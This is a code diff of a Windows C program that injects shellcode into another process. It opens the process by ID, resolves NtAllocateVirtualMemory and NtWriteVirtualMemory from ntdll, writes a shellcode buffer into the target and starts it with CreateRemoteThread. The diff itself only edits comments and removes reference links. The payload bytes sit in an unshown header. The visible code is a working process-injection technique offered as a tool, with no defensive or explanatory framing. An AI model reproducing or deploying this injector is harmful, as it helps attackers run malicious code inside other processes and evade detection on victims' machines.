@@ -4,9 +4,6 @@
 #include <Windows.h>
 #include "utils.h"
 
-//https://www.unknowncheats.me/forum/c-and-c-/69367-lame-base-call-nt-functions.html
-//https://github.com/zodiacon/ErrorLookup
-
 int NTShellExec(DWORD process_id);
 
 int main(int argc, char* argv[]){
@@ -28,7 +25,6 @@ int main(int argc, char* argv[]){
 int NTShellExec(DWORD process_id){
 
     //open handle to given process
-     //open handle to process
     HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, process_id);
 
     if(hProcess == NULL){
@@ -36,7 +32,7 @@ int NTShellExec(DWORD process_id){
         return EXIT_FAILURE;
     };
 
-    //ptr to allocate virtual memory
+    //ptr to AllocateVirtualMemory
     LPNTALLOCATEVIRTUALMEMORY ptrAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
 
     if(ptrAllocateVirtualMemory == NULL){
@@ -63,7 +59,6 @@ int NTShellExec(DWORD process_id){
         printf("unable to get ptr to NtWriteVirtualMemory with error : %zd \n", GetLastError());
     }
 
-
     //write memory
     NTSTATUS WVMstatus = ptrWriteVirtualMemory(hProcess, rBuffer, shellcode_x64, (SIZE_T)(sizeof(shellcode_x64)), NULL);
 
@@ -76,7 +71,7 @@ int NTShellExec(DWORD process_id){
 
     LPDWORD thread_id = NULL;
 
-    //creating thread to run payload
+    //creating thread to run shellcode
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, thread_id);
 
     if(hThread == NULL){
